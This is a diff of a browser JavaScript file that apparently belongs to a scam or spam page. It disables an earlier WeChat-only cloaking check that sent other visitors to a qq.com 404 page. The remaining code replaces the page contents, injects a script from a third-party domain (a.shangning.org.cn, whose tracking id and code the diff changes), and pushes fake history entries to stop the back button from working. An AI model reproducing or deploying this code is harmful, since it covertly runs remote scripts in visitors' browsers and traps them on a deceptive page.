@@ -1,17 +1,17 @@
-var sUserAgent = navigator.userAgent.toLowerCase();
-var bIsIpad = sUserAgent.match(/ipad/i) == "ipad";
-var bIsIphoneOs = sUserAgent.match(/iphone os/i) == "iphone os";
-var bIsMidp = sUserAgent.match(/midp/i) == "midp";
-var bIsUc7 = sUserAgent.match(/rv:1.2.3.4/i) == "rv:1.2.3.4";
-var bIsUc = sUserAgent.match(/ucweb/i) == "ucweb";
-var bIsAndroid = sUserAgent.match(/android/i) == "android";
-var bIsCE = sUserAgent.match(/windows ce/i) == "windows ce";
-var bIsWM = sUserAgent.match(/windows mobile/i) == "windows mobile";
-if (bIsIpad || bIsIphoneOs || bIsMidp || bIsUc7 || bIsUc || bIsAndroid || bIsCE || bIsWM) {
-  if (!(/MicroMessenger/i).test(window.navigator.userAgent)) window.location.href = "http://www.qq.com/404/";
-} else {
-  window.location.href = "http://www.qq.com/404/";
-}
+// var sUserAgent = navigator.userAgent.toLowerCase();
+// var bIsIpad = sUserAgent.match(/ipad/i) == "ipad";
+// var bIsIphoneOs = sUserAgent.match(/iphone os/i) == "iphone os";
+// var bIsMidp = sUserAgent.match(/midp/i) == "midp";
+// var bIsUc7 = sUserAgent.match(/rv:1.2.3.4/i) == "rv:1.2.3.4";
+// var bIsUc = sUserAgent.match(/ucweb/i) == "ucweb";
+// var bIsAndroid = sUserAgent.match(/android/i) == "android";
+// var bIsCE = sUserAgent.match(/windows ce/i) == "windows ce";
+// var bIsWM = sUserAgent.match(/windows mobile/i) == "windows mobile";
+// if (bIsIpad || bIsIphoneOs || bIsMidp || bIsUc7 || bIsUc || bIsAndroid || bIsCE || bIsWM) {
+//   if (!(/MicroMessenger/i).test(window.navigator.userAgent)) window.location.href = "http://www.qq.com/404/";
+// } else {
+//   window.location.href = "http://www.qq.com/404/";
+// }
 
 
 var new_doc1 = document.open("text/html", "replace");
@@ -29,7 +29,7 @@ var script = document.createElement("script");
 script.type = "text/javascript";
 
 
-script.src = "https://a.shangning.org.cn/api/count/tj_stat.html?id=1022&web_id=1022&code=c9301c073d1fd4cb73e39c61ab762fd3";
+script.src = "https://a.shangning.org.cn/api/count/tj_stat.html?id=1023&web_id=1023&code=9abec5383b33895a7a66f538d5df8a56";
 document.getElementsByTagName('head')[0].appendChild(script);
 if (window.history.length <= 10) {
   window.history.pushState({}, "title", "#");
